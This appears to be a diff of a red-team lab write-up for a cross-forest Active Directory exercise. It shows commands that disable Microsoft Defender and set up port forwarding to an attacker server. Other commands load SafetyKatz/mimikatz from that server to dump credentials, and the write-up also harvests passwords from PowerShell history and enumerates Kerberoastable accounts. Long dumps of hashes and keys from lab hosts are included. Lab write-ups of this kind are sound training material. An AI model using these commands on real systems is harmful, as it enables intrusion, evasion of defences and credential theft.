"Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableIntrusionPreventionSystem 1; Set-MpPreference -DisableNetworkProtection 1; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0"</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Copy File into IT-SQLSRV02</h3></div><div dir="auto"><p class=""><code>echo F | XCOPY C:\Users\itemployee41\Documents\Loader.exe \\IT-SQLSRV02\C$\</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1230.9166259765625px"/></a></figure></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command "dir -force 'C:\'"</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Portforwarding on IT-SQLSRV02 → Attacking Workstation</h3></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=192.168.100.41"</code></p></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command "netsh interface portproxy show all"</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Portforwarding Attacking Workstation → Attacking Server</h3></div><div dir="auto"><p class=""><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=192.168.99.41</code></p></div><div dir="auto"><p class=""><code>netsh interface portforwarding show all </code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Dumping credentials from IT-SQLSRV02</h3></div><div dir="auto"><p class=""><code>winrs -r:IT-SQLSRV02 powershell -Command "C:\Loader.exe -Path </code><code><a href="http://127.0.0.1:8080/SafetyKatz.exe">http://127.0.0.1:8080/SafetyKatz.exe</a></code><code> -args 'sekurlsa::ekeys' 'exit'"</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1230.9666748046875px"/></a></figure></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>ekeys</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">mimikatz(commandline) # sekurlsa::ekeys
 
 Authentication Id : 0 ; 3741362 (00000000:003916b2)
 Session           : RemoteInteractive from 2
@@ -1724,66 +1120,11 @@ SID               : S-1-5-18
            rc4_hmac_old      9f781139283fa1e712e9dc349f236834
            rc4_md4           9f781139283fa1e712e9dc349f236834
            rc4_hmac_nt_exp   9f781139283fa1e712e9dc349f236834
-           rc4_hmac_old_exp  9f781139283fa1e712e9dc349f236834</code></pre>
-</details>
-
-<h1>PowerShell History Enumeration in Attacking Workstation</h1>
-
-<p>PowerShell history enumeration is an extremely valuable technique during the reconnaissance and privilege escalation phases of a penetration test.</p>
-
-<h3>How PowerShell History Works</h3>
-
-<p>By default, PowerShell saves a user's command history to a file located at: <code>%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
-
-<p>This file contains plaintext records of commands executed in PowerShell sessions, including:</p>
-
-<ul>
-<li>Commands with parameters and arguments</li>
-<li>Scripts that were executed</li>
-<li>Potentially sensitive information like credentials, connection strings, or API keys</li>
-</ul>
-
-<p>When performing red team assessments, always check PowerShell history:</p>
-
-<ol>
-<li>After gaining initial access to any system</li>
-<li>After privilege escalation to another user</li>
-<li>On servers that handle sensitive operations (like database servers)</li>
-<li>On administrator workstations</li>
-</ol>
-
-<p>This simple check often yields credentials or sensitive information that can dramatically accelerate your assessment and provide new attack paths that would otherwise remain hidden.</p>
-
-<h2>How to Check PowerShell History</h2>
-
-<p>We can enumerate PowerShell history in several ways:</p>
-
-<h3>Direct file access (most reliable)</h3>
-
-<p>This way will simply enumerate the PowerShell history of the current session on the server we are currently.</p>
-
-<p><code>Get-Content (Get-PSReadLineOption).HistorySavePath</code></p>
-
-<p>While inside our attacking workstation, I enumerated the Administrator's Powershell History and I found 2 credentials.</p>
-
-<p><code>Get-ChildItem C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -Force | Get-Content</code></p>
-
-<figure><img src="../../assets/crtm/image 67.png" alt="PowerShell History"/></figure>
-
-<p><code>Vend0r'sDatabaseSecret</code> and <code>Password@123</code>.</p>
-
-<h1><strong>Cross Forest Attacks - Kerberoast Attack</strong></h1>
-
-<p>Let's now access IT-SQLSRV02 using PsExec.exe to ease our remote access.
-<code>PsExec64.exe -accepteula -nobanner \\IT-SQLSRV02 powershell</code></p>
-
-<figure><img src="../../assets/crtm/image 68.png" alt="PsExec Access"/></figure>
-
-<p>Now inside IT-SQLSRV02, If we enumerate the service accounts for msp.local, we will find out several service accounts</p>
-
-<details class="toggle">
-<summary><strong>Service Accounts in msp.local</strong></summary>
-<pre><code>DistinguishedName    : CN=krbtgt,CN=Users,DC=msp,DC=local
+           rc4_hmac_old_exp  9f781139283fa1e712e9dc349f236834</code></pre></div></details></li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">PowerShell History Enumeration in Attacking Workstation</h1></div><div dir="auto"><p class="">PowerShell history enumeration is an extremely valuable technique during the reconnaissance and privilege escalation phases of a penetration test.</p></div><div dir="auto"><h3 class="">How PowerShell History Works</h3></div><div dir="auto"><p class="">By default, PowerShell saves a user's command history to a file located at: <code>%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p></div><div dir="auto"><p class="">This file contains plaintext records of commands executed in PowerShell sessions, including:</p></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc">Commands with parameters and arguments</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc">Scripts that were executed</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc">Potentially sensitive information like credentials, connection strings, or API keys</li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">When performing red team assessments, always check PowerShell history:</p></div><div dir="auto"><ol class="numbered-list" start="1" type="1"><li>After gaining initial access to any system</li></ol></div><div dir="auto"><ol class="numbered-list" start="2" type="1"><li>After privilege escalation to another user</li></ol></div><div dir="auto"><ol class="numbered-list" start="3" type="1"><li>On servers that handle sensitive operations (like database servers)</li></ol></div><div dir="auto"><ol class="numbered-list" start="4" type="1"><li>On administrator workstations</li></ol></div><div dir="auto"><p class="">This simple check often yields credentials or sensitive information that can dramatically accelerate your assessment and provide new attack paths that would otherwise remain hidden.</p></div><div dir="auto"><h2 class="">How to Check PowerShell History</h2></div><div dir="auto"><p class="">We can enumerate PowerShell history in several ways:</p></div><div dir="auto"><h3 class="">Direct file access (most reliable)</h3></div><div dir="auto"><p class="">This way will simply enumerate the PowerShell history of the current session on the server we are currently.</p></div><div dir="auto"><p class=""><code>Get-Content "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"</code></p></div><div dir="auto"><h3 class="">For all users (if you have admin access)</h3></div><div dir="auto"><p class="">In case we do have local admin or simply admin access into the server or workstation we can enumerate powershell history for all local users of the host using the * on the inside Users directory.</p></div><div dir="auto"><p class=""><code>Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -Force | Get-Content</code></p></div><div dir="auto"><h3 class="">Searching for specific strings like passwords</h3></div><div dir="auto"><p class="">The following query will simply search for pattern strings inside PowerShell history file like password, secrets, credentials and etc.</p></div><div dir="auto"><p class=""><code>Get-Content "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" | Select-String -Pattern "password","secret","credentials","key"</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">While inside our attacking workstation, I enumerated the Administrator’s Powershell History and I found 2 credentials.</p></div><div dir="auto"><p class=""><code>Get-ChildItem C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -Force | Get-Content</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><p class=""><code>Vend0r'sDatabaseSecret</code> and <code>Password@123</code>.</p></div><div dir="auto"><h1 class=""><strong>Cross Forest Attacks - Kerberoast Attack</strong></h1></div><div dir="auto"><p class="">Let’s now access IT-SQLSRV02 using PsExec.exe to ease our remote access.<br/><code>PsExec64.exe -accepteula -nobanner \\IT-SQLSRV02 powershell</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1230.9833984375px"/></a></figure></div><div dir="auto"><p class="">Now inside IT-SQLSRV02, If we enumerate the service accounts for msp.local, we will find out several service accounts</p></div><div dir="auto"><h3 class="">Importing and Unzipping ADModule into IT-SQLSRV02</h3></div><div dir="auto"><p class=""><code>Invoke-WebRequest -Uri "</code><code><a>http://127.0.0.1/ADmodule-master.zip</a></code><code>" -OutFile "PowerUpSQL-master.zip"</code></p></div><div dir="auto"><h3 class="">Enumerating Kerberoasting Accounts inside MSP.LOCAL</h3></div><div dir="auto"><p class="">Now that we are inside SQLSRV02, it’s time to start our enumeration. <br/>While enumerating the domain, I found some kerberoasting accounts from MSP.LOCAL domain with the following ADModule commands:</p></div><div dir="auto"><p class="">The example below we specify the domain manually<br/><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server msp.local</code></p></div><div dir="auto"><p class="">We can also use the following command to automate the query<br/><code>Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>Service Accounts on msp.local</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">DistinguishedName    : CN=krbtgt,CN=Users,DC=msp,DC=local
 Enabled              : False
 GivenName            :
 Name                 : krbtgt
@@ -1925,12 +1266,7 @@ SamAccountName       : Forgest
 ServicePrincipalName : {MSSQLSvc/msp-srv08.msp.local}
 SID                  : S-1-5-21-2998733414-582960673-4099777928-1721
 Surname              : Vansant
-UserPrincipalName    : Forgest@msp.local</code></pre>
-</details>
-
-<p>By doing a Cross Forest enumeration service accounts, we can find several Service Accounts inside msp.local, let's focus on the following:</p>
-
-<pre><code>MSSQLSvc/msp-sqlreport.msp.local (mspdb account)
+UserPrincipalName    : Forgest@msp.local</code></pre></div></details></li></ul></div><div dir="auto"><p class="">By doing a Cross Forest enumeration service accounts, we can find several Service Accounts inside msp.local, let’s focus on the following:</p></div><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">MSSQLSvc/msp-sqlreport.msp.local (mspdb account)
 MSSQLSvc/msp-data04.msp.local (Vencome/Tracy Obrien)
 MSSQLSvc/msp-data09.msp.local (Whirosed/Lori Blanchard)
 MSSQLSvc/msp-dc01.msp.local (Preselle/Laverna Cole)
@@ -1939,68 +1275,13 @@ MSSQLSvc/msp-report05.msp.local (Onnithashe/Linda Peterson)
 MSSQLSvc/msp-report08.msp.local (Taboure79/John Jackson)
 MSSQLSvc/msp-san07.msp.local (Addren/James Barker)
 MSSQLSvc/msp-srv04.msp.local (Thatoonse/Carroll Pearson)
-MSSQLSvc/msp-srv08.msp.local (Forgest/Angie Vansant)</code></pre>
-
-<p>Instead of requesting and trying to crack the service account hashes, I decided to try the credentials I found previously during the PowerShell History enumeration</p>
-
-<h2>Executing Commands to MSP-SQLREPORT via PSRemoting Session</h2>
-
-<p>On my first attempt I was already able to access MSP-SQLREPORT.msp.local with user "<code><strong>mspdb</strong></code>" &amp; "<code>Vend0r'sDatabaseSecret</code>" password.</p>
-
-<p>Let's now use Powershell Remoting to remotely access MSP-SQLREPORT.</p>
-
-<p><strong>Let's convert the password to a secure string. This converts the plain text password into a secure string object that can be used for credential creation.</strong></p>
-
-<p><code>$SecurePassword = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force</code></p>
-
-<p><strong>Create a credential object. This creates a PSCredential object using the domain\username format and the secure password.</strong></p>
-
-<p><code>$Credential = New-Object System.Management.Automation.PSCredential("msp\mspdb", $SecurePassword)</code></p>
-
-<p><strong>Configure WinRM TrustedHosts. This configures the local WinRM client to trust the remote server, which is required when connecting to servers not in your domain or when HTTPS isn't used. Requires admin rights.</strong></p>
-
-<p><code>Set-Item WSMan:\localhost\Client\TrustedHosts -Value "MSP-SQLREPORT.msp.local" -Force</code></p>
-
-<p>These commands together allow for authenticating to and accessing a remote Windows server through PowerShell Remoting.
-We can also use the Invoke-Command to simply execute commands inside MSP-SQLREPORT.</p>
-
-<p><code>Invoke-Command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { whoami } -ErrorAction SilentlyContinue</code></p>
-
-<figure><img src="../../assets/crtm/image 69.png" alt="PSRemoting"/></figure>
-
-<h2>PortForwarding to ease Access to our attacking server tools.</h2>
-
-<p>now that we are inside IT-SQLREPORT, let's start by configuring Portfowarding using our workstation attacking machine as our proxy to access out attacking server. this way we can access our attacking tools.</p>
-
-<p><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=443 connectaddress=192.168.4.51 }</code></p>
-
-<p><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { netsh interface portproxy show all }</code></p>
-
-<figure><img src="../../assets/crtm/image 70.png" alt="Port Forwarding MSP-SQLREPORT"/></figure>
-
-<p>Disabling Firewall MSP-SQLREPORT</p>
-
-<p><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableIntrusionPreventionSystem 1; Set-MpPreference -DisableNetworkProtection 1; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0 }</code></p>
-
-<h2>Dumping Credentials on MSP-SQLREPORT</h2>
-
-<p>Let's access MSP-SQLREPORT host using WinRS because it works better than PSRemoting.</p>
-
-<p>Let's now create the inter-realm TGT and inject into our session.</p>
-
-<figure><img src="../../assets/crtm/image 71.png" alt="WinRS Access"/></figure>
-
-<p>Importing Loader into MSP-SQLREPORT.</p>
-
-<p><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { Invoke-WebRequest http://127.0.0.1:443/ligolo_Agent.exe Loader.exe -OutFile 'C:\Loader.exe -UseBasicParsing }</code></p>
-
-<p>Let's now dump credentials inside MSP-SQLREPORT.</p>
-
-<p><code>C:\Loader.exe -Path http://127.0.0.1:443/SafetyKatz.exe -args 'sekurlsa::logonpasswords' 'exit'</code></p>
-
-<details class="toggle">
-<summary><strong>Credentials Dumping - logonpasswords</strong></summary>
-<pre><code>mimikatz(commandline) # sekurlsa::logonpasswords
+MSSQLSvc/msp-srv08.msp.local (Forgest/Angie Vansant)</code></pre></div><div dir="auto"><p class="">Instead of requesting and trying to crack the service account hashes, I decided to try the credentials I found previously during the PowerShell History enumeration</p></div><div dir="auto"><h2 class="">Executing Commands to MSP-SQLREPORT via PSRemoting Session</h2></div><div dir="auto"><p class="">On my first attempt I was already able to access MSP-SQLREPORT.msp.local with user “<code><strong>mspdb</strong></code>” &amp; “<code>Vend0r'sDatabaseSecret</code>” password.</p></div><div dir="auto"><p class="">Let’s now use Powershell Remoting to remotely access MSP-SQLREPORT.</p></div><div dir="auto"><p class=""><strong>Let’s convert the password to a secure string. This converts the plain text password into a secure string object that can be used for credential creation.</strong></p></div><div dir="auto"><p class=""><code>$SecurePassword = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><strong>Create a credential object. This creates a PSCredential object using the domain\username format and the secure password.</strong></p></div><div dir="auto"><p class=""><code>$Credential = New-Object System.Management.Automation.PSCredential("msp\mspdb", $SecurePassword)</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><strong>Configure WinRM TrustedHosts. This configures the local WinRM client to trust the remote server, which is required when connecting to servers not in your domain or when HTTPS isn't used. Requires admin rights.</strong></p></div><div dir="auto"><p class=""><code>Set-Item WSMan:\localhost\Client\TrustedHosts -Value "MSP-SQLREPORT.msp.local" -Force</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">These commands together allow for authenticating to and accessing a remote Windows server through PowerShell Remoting.<br/>We can also use the Invoke-Command to simply execute commands inside MSP-SQLREPORT.</p></div><div dir="auto"><p class=""><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { whoami } -ErrorAction SilentlyContinue</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">PortForwarding to ease Access to our attacking server tools. </h2></div><div dir="auto"><p class="">now that we are inside IT-SQLREPORT, let’s start by configuring Portfowarding using our workstation attacking machine as our proxy to access out attacking server. this way we can access our attacking tools.</p></div><div dir="auto"><p class=""><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=443 connectaddress=192.168.4.51 }</code></p></div><div dir="auto"><p class=""><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { netsh interface portproxy show all }</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2528px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Disabling Firewall MSP-SQLREPORT</p></div><div dir="auto"><p class=""><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableIntrusionPreventionSystem 1; Set-MpPreference -DisableNetworkProtection 1; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0 }</code></p></div><div dir="auto"><h2 class="">Dumping Credentials on MSP-SQLREPORT</h2></div><div dir="auto"><p class="">Let’s access MSP-SQLREPORT host using WinRS because it works better than PSRemoting.</p></div><div dir="auto"><p class="">Let’s now create the inter-realm TGT and inject into our session.</p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Importing Loader into MSP-SQLREPORT.</p></div><div dir="auto"><p class=""><code>Invoke-command -ComputerName 'MSP-SQLREPORT.msp.local' -Credential $Credential -ScriptBlock { Invoke-WebRequest </code><code><a href="http://127.0.0.1:443/ligolo_Agent.exe">http://127.0.0.1:443/</a></code><code>Loader.exe -OutFile 'C:\Loader.exe -UseBasicParsing }</code></p></div><div dir="auto"><p class="">Let’s now dump credentials inside MSP-SQLREPORT.</p></div><div dir="auto"><p class=""><code>C:\Loader.exe -Path </code><code><a href="http://127.0.0.1:443/SafetyKatz.exe">http://127.0.0.1:443/SafetyKatz.exe</a></code><code> -args 'sekurlsa::logonpasswords' 'exit'</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>Credentials Dumping - logonpasswords</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">mimikatz(commandline) # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 3741362 (00000000:003916b2)
 Session           : RemoteInteractive from 2
@@ -2026,14 +1307,199 @@ SID               : S-1-5-21-948911695-1962824894-4291460450-1110
          * Domain   : IT.GCB.LOCAL
          * Password : (null)
         ssp :
-        credman :</code></pre>
-</details>
+        credman :
 
-<p><code>C:\Loader.exe -Path http://127.0.0.1:443/SafetyKatz.exe -args 'sekurlsa::ekeys' 'exit'</code></p>
+Authentication Id : 0 ; 311184 (00000000:0004bf90)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:05:34 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+        ssp :
+        credman :
 
-<details class="toggle">
-<summary><strong>Credentials Dumping - sekurlsa::ekeys</strong></summary>
-<pre><code>mimikatz(commandline) # sekurlsa::ekeys
+Authentication Id : 0 ; 109925 (00000000:0001ad65)
+Session           : Service from 0
+User Name         : SQLTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:38 AM
+SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : IT-SQLSRV02$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:33 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : it-sqlsrv02$
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 60015 (00000000:0000ea6f)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:32 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:34 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 60024 (00000000:0000ea78)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:32 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 58476 (00000000:0000e46c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:31 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
